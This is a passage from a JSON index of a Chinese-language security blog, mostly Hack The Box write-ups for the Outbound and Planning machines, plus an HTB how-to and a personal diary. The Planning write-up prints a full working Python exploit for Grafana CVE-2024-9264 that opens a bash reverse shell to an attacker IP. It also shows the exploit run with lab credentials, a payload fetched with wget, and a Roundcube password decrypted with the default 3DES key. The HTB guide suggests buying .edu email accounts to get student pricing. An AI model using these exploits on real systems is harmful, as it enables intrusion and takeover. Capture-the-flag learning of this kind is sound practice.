有一串类似base64的字符串。CyberChef来解一下，看到密码了，解一下，解不开，前面说用了DES加密，问问聪明的gpt。 聪明的gpt说这个用的是3DES，那就试试呗，先把密码转成HEX key就是rcmail-!24ByteDESkey*Str，不知道IV是什么。问问聪明的gpt。 他说具体流程是这样的（以旧版 3DES/rcube_crypto 为例）： 当 Roundcube 用 des_key 加密 IMAP 密码时，会随机生成一个 8 字节的 IV。 它把这个 IV 放在密文的前 8 个字节，然后再 Base64 编码。那就取前8个字节呗。解出来是595mO8DmwGeD 那就试试呗，切换下用户jacob。 1234567891011121314151617su jacobPassword: 595mO8DmwGeDwhoamijacob# 进去home看看cd /home/jacobls -latotal 36drwxr-x--- 1 jacob jacob 4096 Jun 7 13:55 .drwxr-xr-x 1 root root 4096 Jun 8 12:05 ..lrwxrwxrwx 1 root root 9 Jun 6 19:03 .bash_history -&gt; /dev/null-rw-r--r-- 1 jacob jacob 220 Mar 31 2024 .bash_logout-rw-r--r-- 1 jacob jacob 3771 Mar 31 2024 .bashrc-rw-r--r-- 1 jacob jacob 807 Mar 31 2024 .profiledrwx------ 1 jacob jacob 4096 Jul 9 12:41 mail 有个mail 看看，发现密码了，ssh一下试试连接成功了，看看能不能提权到rootbelow是root权限执行的，看看啥版本0.8 看看有没有CVE，经过查询，真有CVE-2025-27591 按照给出的POC，验证成功 又学到了T_T","link":"/Pwned-Exploiting-HTB-Outbound/"},{"title":"Pwned-Exploiting HTB Planning","text":"Planning 第一步用nmap进行扫描1nmap -sV -sC --min-rate 2000 10.10.11.68 --verbose 发现有22、80端口。那就访问一下80端口 发现无法访问，那就添加到/etc/hosts里面 1echo '10.10.11.68\\tplanning.htb' | sudo tee -a /etc/hosts 找一找，抓抓包，发现没什么可以利用的，那就扫下其他文件和子域名。 1gobuster vhost -u http://planning.htb -w tools/SecLists/Discovery/DNS/combined_subdomains.txt --ne 扫出来一个grafana.planning.htb，加到/etc/hosts里面再访问。利用题目给出的账号密码登录之后，发现grafana版本为11.0，找找CVE。 找到了CVE-2024-9264，以及相应POC。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151import requestsimport argparse&quot;&quot;&quot;Grafana Remote Code Execution (CVE-2024-9264) via SQL ExpressionsSee here: https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/Author: z3k0sec // www.zekosec.com&quot;&quot;&quot;def authenticate(grafana_url, username, password): &quot;&quot;&quot; Authenticate to the Grafana instance. Args: grafana_url (str): The URL of the Grafana instance. username (str): The username for authentication. password (str): The password for authentication. Returns: session (requests.Session): The authenticated session. &quot;&quot;&quot; # Login URL login_url = f'{grafana_url}/login' # Login payload payload = { 'user': username, 'password': password } # Create a session to persist cookies session = requests.Session() # Perform the login response = session.post(login_url, json=payload) # Check if the login was successful if response.ok: print(&quot;[SUCCESS] Login successful!&quot;) return session # Return the authenticated session else: print(&quot;[FAILURE] Login failed:&quot;, response.status_code, response.text) return None # Return None if login failsdef create_reverse_shell(session, grafana_url, reverse_ip, reverse_port): &quot;&quot;&quot; Create a malicious reverse shell payload in Grafana. Args: session (requests.Session): The authenticated session. grafana_url (str): The URL of the Grafana instance. reverse_ip (str): The IP address for the reverse shell. reverse_port (str): The port for the reverse shell. &quot;&quot;&quot; # Construct the reverse shell command reverse_shell_command = f&quot;/dev/tcp/{reverse_ip}/{reverse_port} 0&gt;&amp;1&quot; # Define the payload to create a reverse shell payload = { &quot;queries&quot;: [ { &quot;datasource&quot;: { &quot;name&quot;: &quot;Expression&quot;, &quot;type&quot;: &quot;__expr__&quot;, &quot;uid&quot;: &quot;__expr__&quot; }, # Using the reverse shell command from the arguments &quot;expression&quot;: f&quot;SELECT 1;COPY (SELECT 'sh -i &gt;&amp; {reverse_shell_command}') TO '/tmp/rev';&quot;, &quot;hide&quot;: False, &quot;refId&quot;: &quot;B&quot;, &quot;type&quot;: &quot;sql&quot;, &quot;window&quot;: &quot;&quot; } ] } # Send the POST request to execute the payload response = session.post( f&quot;{grafana_url}/api/ds/query?ds_type=__expr__&amp;expression=true&amp;requestId=Q100&quot;, json=payload ) if response.ok: print(&quot;Reverse shell payload sent successfully!&quot;) print(&quot;Set up a netcat listener on &quot; + reverse_port) else: print(&quot;Failed to send payload:&quot;, response.status_code, response.text)def trigger_reverse_shell(session, grafana_url): &quot;&quot;&quot; Trigger the reverse shell binary. Args: session (requests.Session): The authenticated session. grafana_url (str): The URL of the Grafana instance. &quot;&quot;&quot; # SQL command to trigger the reverse shell payload = { &quot;queries&quot;: [ { &quot;datasource&quot;: { &quot;name&quot;: &quot;Expression&quot;, &quot;type&quot;: &quot;__expr__&quot;, &quot;uid&quot;: &quot;__expr__&quot; }, # install and load the community extension &quot;shellfs&quot; to execute system commands (here: execute our reverse shell) &quot;expression&quot;: &quot;SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash /tmp/rev |');&quot;, &quot;hide&quot;: False, &quot;refId&quot;: &quot;B&quot;, &quot;type&quot;: &quot;sql&quot;, &quot;window&quot;: &quot;&quot; } ] } # Trigger the reverse shell via POST response = session.post( f&quot;{grafana_url}/api/ds/query?ds_type=__expr__&amp;expression=true&amp;requestId=Q100&quot;, json=payload ) if response.ok: print(&quot;Triggered reverse shell successfully!&quot;) else: print(&quot;Failed to trigger reverse shell:&quot;, response.status_code, response.text)def main(grafana_url, username, password, reverse_ip, reverse_port): # Authenticate to Grafana session = authenticate(grafana_url, username, password) if session: # Create the reverse shell payload create_reverse_shell(session, grafana_url, reverse_ip, reverse_port) # Trigger the reverse shell binary trigger_reverse_shell(session, grafana_url)if __name__ == &quot;__main__&quot;: # Set up command line argument parsing parser = argparse.ArgumentParser(description='Authenticate to Grafana and create a reverse shell payload') parser.add_argument('--url', required=True, help='Grafana URL (e.g., http://127.0.0.1:3000)') parser.add_argument('--username', required=True, help='Grafana username') parser.add_argument('--password', required=True, help='Grafana password') parser.add_argument('--reverse-ip', required=True, help='Reverse shell IP address') parser.add_argument('--reverse-port', required=True, help='Reverse shell port') args = parser.parse_args() # Call the main function with the provided arguments main(args.url, args.username, args.password, args.reverse_ip, args.reverse_port) 12# 直接执行python3 poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.16.3 --reverse-port 4444 提权反弹shell成功，并且为root权限，但是并没有发现flag。 传入linpeas.sh并执行看看。 1234567# 本机执行python -m http.server 8888# 靶机执行wget http://10.10.16.3:8888/linpeas.sh -O linpeas.shchmod +x linpeas.sh 执行完之后发现在容器里，看看有什么可以利用的。发现了这个有密码，问问GPT怎么看。 gpt说：👉 这是 Grafana 默认管理员凭证，在渗透中很关键。 通常说明 Grafana 是用这个账号 enzo / RioTecRANDEntANT! 来运行的，可能也能拿来登录 Web 界面或复用到其他地方。 SSH登录下看看。登录成功了，顺手获得了user.txt。 可以看到开启了很多端口，那就一个一个试试，进行端口映射，发现8000端口可以登录。 1ssh -L 9999:127.0.0.1:8000 enzo@10.10.11.68 然后找找系统内是不是存在密码，发现有个.db文件。 打开看到了密码凭证。 以root为账号，登录成功，发现是个设置定时任务的网站，那就反弹shell。 发现连接成功，获得root权限。 又学到了T_T","link":"/Pwned-Exploiting-HTB-Planning/"},{"title":"Welcome to My Blog","text":"Welcome to my first blog! I'm thrilled to embark on this journey where I'll be sharing my study experiences, code snippets, and insights into life. It's my pleasure to meet you all! Stay tuned as I continuously improve and enhance the functionality of this blog. As a beginner, if you have any questions or suggestions, please contacting me at any time via twitter. I will do my best to provide support.","link":"/first/"},{"title":"How to use HTB?","text":"HTB 什么是HTB？Hack The Box 是一个在线平台，用户可以在其中练习黑客技术、漏洞利用、权限提升、逆向分析等网络安全相关技能。它通过各种挑战（Challenges）和靶机（Machines）来模拟现实世界中的漏洞环境。 HTB VIP 和 HTB Academy VIP的区别HTB VIP 主要面向想要提升实战渗透能力的用户，提供大量靶机、官方题解、以及完整挑战环境；而 HTB Academy VIP 则更偏向系统化学习，提供结构化课程与配套实验靶场，适合入门学习或打牢理论基础的用户。两者分别侧重“练”与“学”，互为补充。 HTB Academy VIP更适合0基础的，HTB VIP适合有一定基础的。 开始使用注册在注册网站进行注册，步骤省略。 登录以及使用登录后选择HTB Lab进入。 新手直接选择Stating Point 进入之后选择右上角 1CONNECT TO HTB 接着选择Starting Point来进行连接，这是面向新手的教学专区，里面提供了一些免费的靶机供你练习。接下来选择 OpenVPN 进行连接。Pwnbox 是 HTB 提供的基于网页的渗透测试环境，使用方便，但仅限会员用户使用。 点击后可以选择不同的连接协议，默认推荐使用UDP，如果无法连接，可切换为 TCP。选择合适的协议后，下载对应的 VPN 配置文件，并将其导入到OpenVPN中进行连接。绿色之后就可以选择相应的Machine进行渗透啦。 后续如果你想使用 HTB Academy 并购买会员，通常需要一个国外教育邮箱（.edu）。你可以通过网站EDUEmailShop购买该类邮箱。购买邮箱后，使用它注册HTB Academy账号。注册完成后，前往Academy页面开通会员，每月费用为 8 美元。建议使用PayPal绑定国内银行卡进行支付，便捷且支持自动续费。","link":"/how-to-use-htb/"}],"tags":[{"name":"traffic","slug":"traffic","link":"/tags/traffic/"},{"name":"malware","slug":"malware","link":"/tags/malware/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"study","slug":"study","link":"/tags/study/"},{"name":"penetration test","slug":"penetration-test","link":"/tags/penetration-test/"}],"categories":[{"name":"malware_traffic","slug":"malware-traffic","link":"/categories/malware-traffic/"},{"name":"traffic_analysis","slug":"traffic-analysis","link":"/categories/traffic-analysis/"},{"name":"penetration_test","slug":"penetration-test","link":"/categories/penetration-test/"},{"name":"explanation","slug":"explanation","link":"/categories/explanation/"}],"pages":[{"title":"about","text":"1","link":"/about/index.html"},{"title":"Life","text":"哎，博主已经肥的不行了，体力大不如以前了，于是决定开始减肥，每天记录体重，冲冲冲！ 2024-05-08最近太忙了，不定期更新，五一玩了波爽的。兰州烤肉、手抓肉太好吃辣！ 2024-04-17坏起来了 2024-04-16又胖了，肌肉又涨了，你nnd没抢到五一票！！！！！ 2024-04-15我靠，这两天晚上跑步，没瘦，发现肌肉涨了5斤，体脂率下去了一点T T 2024-04-14早上忘记测了T T 2024-04-13","link":"/life/index.html"}]}